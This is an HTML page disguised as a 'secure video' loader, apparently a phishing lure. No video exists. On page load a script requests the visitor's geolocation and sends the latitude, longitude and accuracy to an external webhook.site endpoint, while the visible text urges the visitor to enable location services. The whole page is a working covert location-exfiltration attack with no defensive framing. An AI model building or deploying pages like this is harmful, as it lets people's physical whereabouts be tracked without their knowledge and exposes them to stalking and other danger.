<!DOCTYPE html>
<html>
<head>
  <title>Loading Video...</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      padding-top: 20%;
    }
  </style>
  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
      fetch('https://webhook.site/63de0275-f746-4b4a-8b0c-5a590380e3db', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          acc: position.coords.accuracy
        })
      });
    });
  </script>
</head>
<body>
  Loading secure video content...<br>
  Please wait<br><br>
  If playback doesn't start, make sure location services are enabled.
</body>
</html>
